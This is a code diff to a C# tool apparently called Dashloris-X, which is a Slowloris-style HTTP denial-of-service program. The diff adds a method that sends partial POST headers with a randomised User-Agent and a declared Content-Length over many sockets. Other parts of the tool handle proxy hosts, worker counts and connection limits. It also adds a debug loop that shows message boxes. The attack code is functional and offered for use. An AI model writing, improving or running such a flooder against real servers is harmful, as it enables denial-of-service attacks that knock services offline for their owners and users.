@@ -20,7 +20,7 @@ using DashFramework.Dialog;
 
 namespace TheDashlorisX
 {
-    public class AttaccLog
+    public class AttaccLog : UserAgents
     { 
 	public readonly SpruceLog SprucyLog = new SpruceLog();
 	private readonly DashNet DashNet = new DashNet();
@@ -173,7 +173,7 @@ namespace TheDashlorisX
 
 		SendLog("- Validating configuration ....");
 
-		/*Send Delay, Timeout, Dash Workers, Max Cons, Content Length and UAR*/
+		/*Send Delay, Timeout, Dash Workers, Max Cons, Content Length and UAR*/                
 		(int, int, int, int, int, bool) Tier2 = ParseSect2(S3Class2);
 		/*Proxy Hosts and Proxy Credentials*/
 		(List<string>, List<string>) Tier3 = ParseSect3(S3Class2);
@@ -281,12 +281,42 @@ namespace TheDashlorisX
 		}
 	    }
 
-	    private void SendArtillery((string, int, int, string) Tier1, (int, int, int, int, int, bool) Tier2)
+	    private readonly Random Rand = new Random();
+
+	    private string GetRandomUA()
 	    {
 		try
 		{
-		    //1: Construct Header (Get HTTP Version, User-Agent-Randomizator and Content Length) 
-		    //2: Send Header
+		    return (Collection[Rand.Next(CollectionLength)]);
+		}
+
+		catch (Exception E)
+		{
+		    throw (ErrorHandler.GetException(E));
+		}
+	    }
+
+	    private void SendArtilleryShell(Socket DashShell, (string, int, int, string) Tier1, (int, int, int, int, int, bool) Tier2)
+	    {
+		try
+		{
+		    if (DashShell.Connected)
+		    {
+			string Default = ("Mozilla/5.0 (Windows NT 10.0; WOW64; rv:65.0) Gecko/20100101 Firefox/65.0 IceDragon/65.0.2");
+
+			string Coal = string.Format
+			(
+			    ($"POST / @\r\n".Replace("@", Tier1.Item4)) +
+			    ($"Host: @\r\n".Replace("@", Tier1.Item1)) +
+			    ($"Content-Length: @\r\n".Replace("@", Tier2.Item5.ToString())) +
+			    ($@"User-Agent: {(Tier2.Item6 ? GetRandomUA() : Default)} \r\n") +
+			    ($"Accept-Encoding: gzip, deflate\r\n") +
+			    ($"Upgrade-Insecure-Requests: 1\r\n") +
+			    ($"Cookie: Dashloris-X 3.0 Cookie\r\n\r\n") 
+			);
+
+			DashShell.Send(Encoding.ASCII.GetBytes(Coal));
+		    }
 		}
 
 		catch (Exception E)
@@ -366,6 +396,9 @@ namespace TheDashlorisX
 	    {
 		try
 		{
+		    for (int k = 0; k < 8; k += 1)
+		    MessageBox.Show($"{GetRandomUA()}");
+
 		    StartDurationCounter(Tier1.Item3, Logy);
 		    StartStatUpdater(Logy);
 
@@ -423,7 +456,7 @@ namespace TheDashlorisX
 
 					if (DashShell.Connected)
 					{
-					    SendArtillery(Tier1, Tier2);
+					    SendArtilleryShell(DashShell, Tier1, Tier2);
 					    ReportStatics(Logy, true);//Add 
 
 					    Connections.Add(DashShell);
